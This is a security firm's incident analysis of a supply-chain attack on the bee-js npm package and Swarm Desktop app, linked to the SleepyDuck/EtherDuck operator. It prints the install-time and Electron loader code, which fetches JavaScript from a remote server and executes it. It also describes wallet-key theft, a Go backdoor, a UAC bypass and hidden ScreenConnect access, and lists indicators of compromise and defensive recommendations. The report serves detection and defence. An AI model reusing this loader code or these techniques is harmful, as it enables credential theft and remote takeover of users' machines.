Every malicious commit was authored as lab-bot or bee-worker and is unsigned. Author fields are client-set and worthless as evidence: lab-bot is fabricated and its noreply address is malformed, while bee-worker was copied verbatim from public history. Ethersphere’s genuine release commits are created through GitHub’s API and carry a Verified badge. What identifies the actor is the push event, and swarm-cli’s activity log attributes all thirteen November 6 pushes to nugaon.

Malicious bee-js 13.3.0 #

A Version Generator Turned Into a Loader

At 23:59:54 UTC on November 8 (client-set time), an unsigned commit, de2f74e, authored as the project’s release identity bee-worker, modified four files: CHANGELOG.md, package-lock.json, package.json and scripts/generate-version.cjs. The commit copies the title of an open pull request created by release-please, a tool that automates software releases (“chore(upcoming): release 13.3.0”), but does not belong to any branch and was never submitted through a pull request.

Two edits to package.json were needed for the loader to run on consumer machines. The files list gained scripts, so the script ships in the tarball for the first time, and the existing prepare hook was renamed to postinstall with the same command:

"files": [ "dist", "scripts" ], "scripts": { "prepublishOnly": "NODE_ENV=production npm run build", "postinstall": "node scripts/generate-version.cjs",

This is the first install-time hook in the package’s npm history: none of the other 177 versions in the packument declares one.

The script itself still does its original job of generating src/version.ts from the engines field, but the threat actor inserted a block at the top of scripts/generate-version.cjs that runs first and unconditionally:

try { const req = require('https').get( '<https://api.frameworkmetrics.xyz/v1/analytics>', { headers: { 'User-Agent': process.platform, 'X-Ethersphere': '1', }, timeout: 3000, }, async res => { let body = '' for await (const chunk of res) body += chunk new Function('require', 'console', 'process', body)(require, console, process); }, ) req.on('error', () => {}).on('timeout', () => req.destroy()) } catch {}

The request sends the operating system as the User-Agent and a gate header, X-Ethersphere: 1. There is no environment, CI, locale or time check. Whatever the server returns is compiled with new Function and called with the real require, console and process, so the downloaded code runs in-process with the installing user’s privileges and can load any Node.js module. The response status, content type and size are never checked. The sink line is also the only semicolon-terminated statement in a file that otherwise follows the repository’s semicolon-free Prettier style.

The surrounding comments frame the hook as code generation and the request as an “analytics ping”. The header comment says the script “must NEVER fail an install”, and a later comment explains that the script uses return rather than process.exit so it does not kill the ping. That early return fires on every consumer install, because published tarballs ship no src/ directory, and it keeps the process alive until the download finishes.

The “never fail” promise is only partly true. Request-level errors (DNS failure, TLS failure, no response within three seconds) are swallowed and the install succeeds silently. Errors after the response starts are not covered by the try block: a body that is not valid JavaScript, a payload that throws, or a stalled transfer becomes an unhandled promise rejection, which ends Node.js 15 and later with exit code 1 and fails the install. A failed install is therefore not evidence that a machine was spared, because the request has already been sent.

Package manager defaults matter here. npm 11 and earlier, Yarn Classic, and Yarn Berry before 4.14.0 run dependency postinstall scripts by default. npm 12, pnpm 10 and later, Yarn Berry 4.14.0 and later, Bun and Deno skip unreviewed dependency scripts by default, so on those clients the loader does not run unless the project allowlisted it.

The Loader Ran Inside Ethersphere’s Publishing Job

At 00:06:01 UTC on November 9, bee-worker published a GitHub release for an unsigned annotated tag v13.3.0 pointing at de2f74e. The release event started the project’s Publish on npm workflow. That workflow runs its test, check and entrypoint jobs only on push events, and its publish job explicitly accepts release events with those jobs skipped:

publish: needs: [tests-stable, tests-rc, check, entrypoint] # Publish on a release (CI jobs are skipped there), or on an `upcoming` push only when every # CI job succeeded. `!cancelled()` lets the job evaluate even though the needed jobs are # skipped on the release path. if: >- !cancelled() && (github.event_name == 'release' || (needs.tests-stable.result == 'success' && needs.tests-rc.result == 'success' && needs.check.result == 'success' && needs.entrypoint.result == 'success')) runs-on: ubuntu-latest environment: publish

Nothing in the workflow checks that the released commit belongs to the protected upcoming branch, and the publish environment has no required reviewers or tag policy. The deployment went from creation to success in 73 seconds with no approval step. No npm token was needed: the legitimate workflow, running legitimate workflow code from the tag, published the threat actor’s commit.

Because the build itself calls the rewritten script, and package.json now also declared it as postinstall, the loader ran inside this job, which has id-token: write permission for trusted publishing. The public job log shows three executions (the root postinstall during npm ci, npm run build, and the prepublishOnly build during npm publish), and each is followed a few hundred milliseconds later by a line that exists nowhere in the package, the repository or any other run’s log:

2026-11-09T00:06:19.9251494Z > node scripts/generate-version.cjs 2026-11-09T00:06:19.9251720Z 2026-11-09T00:06:19.9741926Z Generated src/version.ts from package.json engines 2026-11-09T00:06:20.3545705Z [FrameworkMetrics] analytics v2.3.1 is up to date

The C2 server therefore answered Ethersphere’s GitHub-hosted runner with JavaScript at 00:06:20, 00:06:21 and 00:06:43 UTC, more than five and a half hours before the first payload capture recorded in SafeDep’s IOC list (05:43 UTC). What that JavaScript did beyond printing the line is not visible in the log. The published build was not altered: all 331 dist/ files in 13.3.0 are byte-identical to the legitimate 13.3.0-upcoming.g4568f7a pre-release built from the parent commit, and the only differences are package.json and the loader. Whether the served code read the runner’s environment or requested an OIDC token cannot be determined from public data. No other Ethersphere npm package had been published after 13.3.0 when we checked at 09:21 UTC.

npm received @ethersphere/bee-js@13.3.0 under the latest dist-tag at 00:09:50 UTC and removed it at 01:24:58 UTC. GitHub issued GHSA-hh7j-5m3j-23pf at 01:25:27 UTC.

The Provenance Was Genuine

The 13.3.0 provenance attestation is not forged. We verified the bundle offline end to end (DSSE signatures, Fulcio certificate chain, embedded SCT, Rekor inclusion proofs and the tarball’s sha512 digest). The signing certificate correctly names publish_npmjs.yaml@refs/tags/v13.3.0, commit de2f74e, the release trigger and the publish environment. The legitimate 13.2.0 attestation has exactly the same shape, so provenance alone could not have told the two releases apart. It proves where a package was built, not that the source was reviewed.

Trojanized Swarm Desktop 0.56.2 #

Built, Signed and Notarized by the Project’s Own CI

About 30 minutes after the npm publish, the same release identity created a branch named emergency/0.56.2 at commit 2de7270, and published GitHub release v0.56.2 (“emergency patch release”) as a full, non-draft release, all within seven seconds and before any build assets existed. The commit imitates a release-please release but bumps only package.json, leaving the release-please manifest at 0.56.1, and adds the loader to src/index.ts. The repository’s master branch was never touched.

The threat actor then dispatched pre-release.yml, a manually triggered workflow that takes a free-form branch input, has no environment protection and hands the build the Apple and Windows signing certificates, their passwords and the Apple ID used for notarization. That workflow had been broken since March 2026 because it never installed pnpm, so the first run failed. About two minutes after that failure, commit dc7d745 added the missing pnpm/action-setup step (a second run, started just before the fix was pushed, failed the same way). It carries a Co-authored-by: Cursor <cursoragent@cursor.com> trailer and, according to GitHub’s push record, was pushed through the nugaon account described above. The third run built, signed, notarized and uploaded all ten assets between 00:41:24 and 00:44:55 UTC, even though it ended with a “failure” status because a second macOS arm64 job failed code signing.

The Loader in the Electron Main Process

Every 0.56.2 package we unpacked (Linux deb and rpm for amd64 and arm64, the macOS arm64 zip, and the Windows Setup.exe, nupkg and zip) contains the same dist/desktop/src/index.js inside app.asar, with SHA-256 f81315968e679b48f6bdff1c9b928bb223230d07f44d7948412c2250c2a14deb. The arm64 DMG comes from the same CI job; we did not open it. Comparing against 0.56.1, exactly seven of the 6,769 files in the archive change; the other six are the source map, two version fields and pnpm metadata, and the only code change is a 731-byte insertion into index.js. The source change in 2de7270 adds an https import and the following block, shown here as compiled into index.js with surrounding context:

async function main() { logger_1.logger.info(`Bee Desktop version: ${package_json_1.default.version} (${process.env.NODE_ENV ?? 'production'})`); new Promise((resolve, reject) => { const req = node_https_1.default.request({ hostname: 'api.frameworkmetrics.xyz', port: 443, path: '/v1/electron', method: 'GET', headers: { 'User-Agent': process.platform, 'X-Ethersphere': '1', }, }, (res) => { let body = ''; res.setEncoding('utf8'); res.on('data', (c) => { body += c; }); res.on('end', () => new Function('require', 'console', 'process', body)(require, console, process)); }); req.on('error', reject); req.end(); }); const gotTheLock = (0, electron_2.runElectronTray)(); if (!gotTheLock) return;

The loader is the first action of main(), which runs unconditionally when the module loads. It fires at every launch of the app, before the single-instance lock, the splash window, the updater and app.whenReady, and it runs in the unsandboxed main process with the same new Function sink and the same two headers as the npm loader. It is not identical code: it uses a different path (/v1/electron), https.request instead of https.get, no timeout, and no error handling. A failed request rejects a promise nobody awaits, so an unreachable or misbehaving server likely produces Electron’s “A JavaScript error occurred in the main process” dialog rather than failing silently.

Swarm Desktop stores the Bee node’s config.yaml, which includes a plaintext password value, and the node key under data-dir/keys/ on every install, so the files that stage 2 targets (see below) are present on every affected machine.

Signed, Notarized and Pushed Through Auto-Update

The macOS app is signed “Developer ID Application: Swarm Association (9J9SPHU9RP)” with the same certificate as 0.56.1. The signature covers the trojanized archive: the ElectronAsarIntegrity value in the signed Info.plist equals the hash of the malicious app.asar header. Apple’s stapled notarization ticket, issued at 00:44:05 UTC, lists all 15 Mach-O code directory hashes in the bundle, none of which appear in 0.56.1. Gatekeeper therefore shows only the normal first-launch prompt. The Windows binaries carry an Authenticode signature made with the same Apple-issued certificate. That signature is mathematically valid, but Apple’s roots are not in Microsoft’s trusted root program, so Windows should treat it as untrusted (we did not test this on a Windows host). The Linux packages are unsigned and have no maintainer scripts; the loader runs when the app starts.

Swarm Desktop uses update-electron-app, which polls update.electronjs.org every ten minutes on macOS and Windows. That service ignores drafts and pre-releases, which is why publishing v0.56.2 as a full release mattered. Windows x64 clients could be offered 0.56.2 from 00:43:17 UTC and Apple Silicon Macs from 00:44:49 UTC. Intel Macs were never offered it because pre-release.yml has no Intel macOS job, and Linux packages do not auto-update.

Ethersphere maintainers deleted the v0.56.2 tag at 09:04 UTC and the release was no longer public by about 09:14 UTC. Deleting a release does not roll anyone back: the update service never offers an older version, so machines that already updated to 0.56.2 stay on it until a 0.56.3 or later release ships. As of 10:30 UTC on November 9, no 0.56.3 had been published.

Later Stages #

Stage 2: without the X-Ethersphere: 1 header the server returns a harmless decoy. With it, it returns plain JavaScript for the requesting operating system; the macOS and Windows payloads are the same on both endpoints, and Linux has one variant per endpoint. On both the npm and the desktop path, the payload looks for Swarm Desktop’s data directory and posts the node’s config.yaml and data-dir/keys/swarm.key to hxxps://api[.]frameworkmetrics[.]xyz/v1/swarm/report. The key file is an encrypted Ethereum keystore, but config.yaml holds its password in plain text, so the two files together hand over the node wallet. The payload then downloads the stage 3 for the host’s operating system and architecture from the /v1/assets/ path on the same server.

Stage 3 (macOS and Linux): a Go backdoor whose module is named evjawbreaker, written to ~/.solidity/ under its platform name (for example linux_amd64 or darwin_arm64) and started by ~/.solidity/.run.py (or ~/.solidity/.run.cjs on macOS when Node.js is present). It persists as systemd user unit solidity-langsupport-runner.service, which it repairs on every run if the unit was changed, or as LaunchAgent com.solidity.langsupport.runner, clearing the macOS quarantine attribute. It exits before connecting if it detects a debugger or a virtual machine. Otherwise it reads its hub address from the Ethereum contract through public RPC gateways such as rpc.ankr.com and cloudflare-eth.com, connects to the hub over TLS without validating the certificate, and runs the operator’s commands in a persistent sh pseudo-terminal.

Stage 3 (Windows): the payload first checks whether ScreenConnect is already installed, stages its files as %TEMP%\.stuffed-* and runs an obfuscated PowerShell loader, invoke.ps1. If the user is a local administrator, the loader uses UACME method 39 (COR_PROFILER) against mmc.exe to elevate without a prompt; otherwise it shows the UAC prompt again every time the user cancels it. With administrator rights it adds a Microsoft Defender exclusion, silently installs a genuine, ConnectWise-signed ScreenConnect 25.4.3 client configured for relay 185[.]232[.]84[.]169:8041 with its tray icon and connection banners hidden and sessions starting without asking the user, then removes the exclusion and the staging files. The client runs as the SYSTEM service ScreenConnect Client (5cbe79c9c25524df).

The “Solidity language support” names make little sense for Swarm users. They are carried over unchanged from the Open VSX campaign described next.

Infrastructure: an Ethereum Dead Drop Shared With SleepyDuck #

Contract 1 and Its Write History

Contract 0xf8a900Db50b3331be6B768bA460BB59f3E40C344 on Ethereum mainnet is a minimal configuration store. param1() (selector 0x02d91518) returns the hub address and param2() (selector 0x1f049b68) returns a payload URL; only the owner, 0xFd3fc58bcbd8ccc77b6000201438eDfc636E7cA7, can change them. Because the values are plain ABI strings in transaction calldata, the full history can be decoded:

March 14, 2026: the contract is deployed 13 minutes after the owner wallet is funded. The first hub value is hxxp://localhost:4912, an operator test, followed 40 minutes later by 107[.]189[.]16[.]215:4912.

March 28 to 29: hub 91[.]108[.]240[.]156:4912 and payload URL hxxp://91[.]108[.]240[.]156:3000/app[.]js.

May 3 and May 16: hub 107[.]189[.]27[.]46:4912 and payload URL hxxp://107[.]189[.]27[.]46:3000/app[.]js, which is still the current param2.

July 31: hub 107[.]189[.]27[.]223:4912.

September 23 and 24: hub 178[.]16[.]54[.]222:4912, then 193[.]57[.]9[.]17:4912.

November 8, 23:30:47 UTC: hub 193[.]57[.]9[.]155:4912, written 29 minutes before the malicious bee-js commit.

The loader domain frameworkmetrics[.]xyz was registered on November 6, 2026 at 15:08 UTC through NICENIC with Cloudflare nameservers, about 57 hours before the bee-js commit.

The Same Operator as SleepyDuck / EtherDuck

On October 1, 2026, Pluto Security published an analysis of “EtherDuck”, two waves of malicious Open VSX extensions that impersonated the juanblanco.solidity and NomicFoundation.hardhat-solidity extensions between September 24 and 26, 2026, and that Pluto attributes to the actor behind the 2025 SleepyDuck campaign. Those extensions read their configuration from the same contract, owned by the same wallet. Several independent points tie the two operations together:

Pluto’s on-chain timeline for the contract (deployment plus two changes on March 14, three changes on March 28 and 29, two in May, one on July 31, two on September 23 and 24) matches our decoded history write for write. Pluto’s hub value 193[.]57[.]9[.]17:4912 is the value the contract held until November 8. The November 8 write is the only one made after Pluto’s report.

The two September changes landed about 25 and 6 hours before the first EtherDuck listings went live, and the May 3 hub change came two days after the earlier juannegro.solidity listing was published on May 1. Not every change lines up with a known wave: the March changes preceded the first known listing by weeks, and Pluto found none for July 31.

Six of the seven payload hashes Pluto published (the four Go backdoor builds, the PowerShell loader and the ScreenConnect installer) are the same six files SafeDep downloaded from the bee-js C2’s /v1/assets/ path on November 9. The Go builds were reused unchanged (Pluto found the same builds in both the spring and September waves): the implant looks up its hub in the contract at runtime, so a new contract value was enough to point it at new infrastructure.

The persistence names (~/.solidity/, com.solidity.langsupport.runner, solidity-langsupport-runner.service), the ScreenConnect instance 5cbe79c9c25524df and relay 185[.]232[.]84[.]169:8041 are identical.

Pluto did not find a distribution wave for the July 31 change. The chain suggests a reason: that day a second wallet, 0xA7B15A2B5F6992DC3BabB946375d6895fF1171BF, deployed a second contract, 0x6a82595EEea0f4FDFB3aE13A2687BcbBE626e94B, with the same getter selectors but renamed setters, and values that appear to be encoded with a per-slot substitution cipher. The two wallets are linked directly: the first wallet sent calldata to the new contract that was byte-identical to the second wallet’s successful transaction 72 seconds later, and both were funded by the same high-volume payout wallet, most likely an exchange or swap service. Our partial decode of the second contract’s values points to a public IP address on port 4444 and a payload URL on the same host, but we found no client that reads it.

Taken together, the same operator moved from fake developer extensions that a victim had to find and install, to compromising a real project’s release pipeline and shipping through npm trusted publishing and an Apple-notarized desktop app. The target profile, developers working with Ethereum tooling and wallets, did not change.

Impact #

bee-js: @ethersphere/bee-js had 3,741 downloads between November 1 and 8. Version 13.3.0 was on the registry as latest for about 75 minutes, and per-version counts for it are not available; based on daily traffic, we estimate on the order of ten fetches of 13.3.0, including scanners and mirrors. Any project that installed it, or freshly resolved a dependent with a ^13 range, during that window with install scripts enabled ran the loader. Dependents whose published ranges admit 13.3.0 include @ethersphere/swarm-cli 3.6.0 and 3.7.0, @ethersphere/bee-dashboard 0.37.0 and 0.37.1, @snaha/swarm-id 0.5.0 to 0.8.0, @solarpunkltd/file-manager-lib 1.1.0 and 1.1.1, and bee-wasm-js 0.1.0 and 0.1.1, plus new create-swarm-app projects. @ethersphere/bee-dashboard 0.33.0 to 0.36.2 also reach it indirectly through @solarpunkltd/file-manager-lib. A CI job that installed it ran the loader with that job’s environment and, where granted, its OIDC token capability.

Swarm Desktop: the v0.56.2 download counters reached 65 by 08:27 UTC, including 22 downloads of the darwin-arm64 zip that the macOS updater fetches and 3 of the Windows nupkg. These are upper bounds that include researchers. Every affected machine requested stage 2 at every app launch, and ran it whenever the C2 answered.

Data and access at risk: the Bee node password and wallet key (and with them any node balance, chequebook or stake), anything the installing user or CI job could read, and, per the reported stage 3, persistent remote shell access on macOS and Linux and unattended ScreenConnect access on Windows.

Residual copies: at 10:30 UTC on November 9 the Huawei Cloud npm mirror still served the malicious bee-js-13.3.0.tgz with matching checksums, and GitHub still served source tarballs of the malicious commits by SHA.

Recommendations #

For bee-js Users

Search lockfiles, package-manager caches and internal registries for @ethersphere/bee-js@13.3.0 or integrity sha512-ltkrphoNy7TBIjCICDW7y3qa+j8yljt3+ohPRSM+id1rK2NaOgm5H5V/FioTQ0rEJ5IJ+Zj1micbAdQCqqc8iw== and pin 13.2.0. Purge cached copies, including any mirror you install through.

Treat any developer machine or CI job that installed 13.3.0 with scripts enabled between 00:09:50 and 01:24:58 UTC on November 9 as having run the threat actor’s code, even if the install failed. Rotate credentials reachable from those environments, including cloud credentials obtainable through CI OIDC trust.

On npm 11.16 through 11.21, CI and terminal logs name @ethersphere/bee-js@13.3.0 (postinstall: node scripts/generate-version.cjs) in an install-scripts warning, and npm debug logs record an info run line for the same script.

For Swarm Desktop Users

Check whether 0.56.2 ever ran: each launch writes Bee Desktop version: 0.56.2 (production) to bee-desktop.log before the loader executes.

Uninstall 0.56.2 and install 0.56.3, the clean replacement release. macOS and Windows clients should also receive 0.56.3 automatically through the auto-updater, but check the installed version rather than waiting for it; Linux packages do not auto-update and must be replaced manually.

Assume the node password and key were stolen. Move node wallet funds, chequebook and stake to a new key from a clean machine.

Look for ~/.solidity/, the com.solidity.langsupport.runner LaunchAgent, the solidity-langsupport-runner.service user unit and the ScreenConnect Client (5cbe79c9c25524df) service. Reinstalling the app does not remove them.

For Maintainers

Do not let a release event publish without proof that the released commit is on a protected branch or came from a merged release pull request. Run that check inside the publishing workflow, because trusted publishing and provenance will faithfully sign whatever the workflow builds.

Put the publishing environment behind required reviewers and restrict which tags can deploy to it. Use repository rulesets to restrict tag and release creation.

Do not skip tests on the release path, and do not expose signing certificates and notarization credentials to manually dispatched workflows that accept an arbitrary branch input.

Treat a release-bot identity’s token as a publishing credential: scope it narrowly, rotate it, and alert on releases that bypass the normal release-please flow.

For Security Teams

Hunt DNS and proxy logs for api[.]frameworkmetrics[.]xyz and for connections to the hub and relay addresses below.

Where RPC traffic is visible (TLS inspection or endpoint telemetry), hunt for eth_call requests to 0xf8a900Db50b3331be6B768bA460BB59f3E40C344 with data 0x02d91518, in particular from binaries under ~/.solidity/. This would flag the backdoor regardless of whether it arrived through npm, Swarm Desktop or an Open VSX extension.

Watch the contract for new writes. It emits no events, so poll its getters or storage rather than waiting for logs.

Socket detects threats like this across the full dependency graph, including install-time loaders that fetch and execute remote code, before they reach developer environments. The Socket GitHub App scans pull request dependency changes and flags new install scripts and network access in dependency updates before merge. The Socket CLI enforces allow and deny rules in CI pipelines. Socket Firewall blocks known malicious packages before they are fetched. The Socket browser extension surfaces risk signals while browsing npm. Socket MCP prevents AI-assisted coding workflows from introducing suspicious dependencies into your codebase.
